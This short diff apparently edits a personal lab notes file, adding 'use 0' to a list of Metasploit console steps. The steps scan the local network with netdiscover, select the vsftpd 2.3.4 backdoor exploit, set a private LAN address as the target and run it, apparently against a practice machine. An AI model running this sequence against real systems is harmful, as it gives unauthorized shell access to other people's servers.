@@ -2,6 +2,7 @@ l2:
 	/usr/share/kali-menu/helper-scripts/metasploit-framework.sh
 	sudo netdiscover
 	search vsftpd 2.3.4
+	use 0
 	show options
 	set RHOSTS 192.168.0.104
 	exploit
